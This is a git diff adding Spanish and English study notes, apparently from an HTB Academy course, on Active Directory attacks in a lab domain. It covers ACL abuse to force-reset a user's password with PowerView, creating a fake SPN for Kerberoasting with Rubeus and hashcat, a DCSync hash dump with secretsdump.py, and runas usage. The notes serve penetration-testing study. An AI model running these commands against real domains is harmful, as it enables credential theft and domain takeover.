@@ -1236,6 +1236,143 @@ Convertir de un SID a nombre
 
 ![image](https://github.com/gecr07/HTB-Academy/assets/63270579/b0b6f077-061c-435e-a0ab-859a0f0d2363)
 
+The output above shows that our adunn user has DS-Replication-Get-Changes and DS-Replication-Get-Changes-In-Filtered-Set rights over the domain object. This means that this user can be leveraged to perform a DCSync attack. We will cover this attack in-depth in the DCSync section. (busca el usuario adunn con el bloodhound)
+
+## ACL Abuse Tactics
+
+![image](https://github.com/gecr07/HTB-Academy/assets/63270579/65d4610b-8c37-42c6-b153-518c8eeae384)
+
+Para hacer todo esto hay que loggearnos como el usuario wley como no se puede vamos a crear un objeto PSCredentials
+
+```
+$SecPassword = ConvertTo-SecureString 'transporter@4' -AsPlainText -Force
+$Cred = New-Object System.Management.Automation.PSCredential('INLANEFREIGHT\wley', $SecPassword)
+
+# Next, we must create a SecureString object which represents the password we want to set for the target user damundsen.
+
+$damundsenPassword = ConvertTo-SecureString 'Pwn3d_by_ACLs!' -AsPlainText -Force
+
+# Finally, we'll use the Set-DomainUserPassword PowerView function to change the user's password.
+
+Set-DomainUserPassword -Identity damundsen -AccountPassword $damundsenPassword -Credential $Cred -Verbose
+
+
+```
+
+Recuerda que aqui usan tanto funciones del modulo de ActiveDirectory como de PowerView
+
+![image](https://github.com/gecr07/HTB-Academy/assets/63270579/ec5faf8c-1c93-48d4-8dc3-ecc3ae65ea4a)
+
+![image](https://github.com/gecr07/HTB-Academy/assets/63270579/c5c29a53-24c5-46cb-9451-3cc7dfd78571)
+
+### Create a fake SPN
+
+```
+Set-DomainObject -Credential $Cred2 -Identity adunn -SET @{serviceprincipalname='notahacker/LEGIT'} -Verbose
+```
+
+### Kerberoasting with Rubeus
+
+
+```
+.\Rubeus.exe kerberoast /user:adunn /nowrap
+
+hashcat -m 13100 hash.txt /usr/share/wordlists/rockyou.txt
+```
+
+## DCSync
+
+DCSync is a technique for stealing the Active Directory password database by using the built-in Directory Replication Service Remote Protocol, which is used by Domain Controllers to replicate domain data. This allows an attacker to mimic a Domain Controller to retrieve user NTLM password hashes.
+
+To perform this attack, you must have control over an account that has the rights to perform domain replication (a user with the Replicating Directory Changes and Replicating Directory Changes All permissions set). Domain/Enterprise Admins and default domain administrators have this right by default.
+
+Based on our work in the previous section, we now have control over the user adunn who has DCSync privileges in the INLANEFREIGHT.LOCAL domain. Let's dig deeper into this attack and go through examples of leveraging it for full domain compromise from both a Linux and a Windows attack host.
+
+
+
+### Atacando desde Linux
+
+Primero sacamos los datos necesarios
+
+```
+Get-DomainUser -Identity adunn  |select samaccountname,objectsid,memberof,useraccountcontrol |fl
+#Con este comando sacamos el SID
+#Despues sacamos los ACLs de ese usuario
+
+$sid= "S-1-5-21-3842939050-3880317879-2865463114-1164"
+Get-ObjectAcl "DC=inlanefreight,DC=local" -ResolveGUIDs | ? { ($_.ObjectAceType -match 'Replication-Get')} | ?{$_.SecurityIdentifier -match $sid} |select AceQualifier, ObjectDN, ActiveDirectoryRights,SecurityIdentifier,ObjectAceType | fl
+
+```
+
+Atacando con Linux
+
+```
+ secretsdump.py -outputfile inlanefreight_hashes -just-dc INLANEFREIGHT/adunn@172.16.5.5
+
+# Nos genera este output
+
+
+inlanefreight_hashes.ntds  inlanefreight_hashes.ntds.cleartext  inlanefreight_hashes.ntds.kerberos
+
+```
+
+Existen muchas posibles configuraciones para este comando dependiendo de lo que queramos sacar. 
+
+### Viewing an Account with Reversible Encryption Password Storage Set
+
+When this option is set on a user account, it does not mean that the passwords are stored in cleartext. Instead, they are stored using RC4 encryption. The trick here is that the key needed to decrypt them is stored in the registry (the Syskey) and can be extracted by a Domain Admin or equivalent. Tools such as secretsdump.py will decrypt any passwords stored using reversible encryption while dumping the NTDS file either as a Domain Admin or using an attack such as DCSync.
+
+Para enumerar usuarios con este tipo de cifrado
+
+```
+ Get-ADUser -Filter 'userAccountControl -band 128' -Properties userAccountControl
+# Con powerview
+
+Get-DomainUser -Identity * | ? {$_.useraccountcontrol -like '*ENCRYPTED_TEXT_PWD_ALLOWED*'} |select samaccountname,useraccountcontrol
+```
+Se puede hacer con mimikatz
+
+![image](https://github.com/gecr07/HTB-Academy/assets/63270579/310d1643-13e7-460b-ade5-ef622b87578d)
+
+
+
+## RUNAS
+
+Para correr comandos en el contexto de otro usuario se utiliza esta herramienta.
+
+```
+runas /netonly /user:INLANEFREIGHT\adunn powershell
+```
+
+![image](https://github.com/gecr07/HTB-Academy/assets/63270579/eafc11e2-c99e-435f-ace0-af603d618bc4)
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
 
 
 
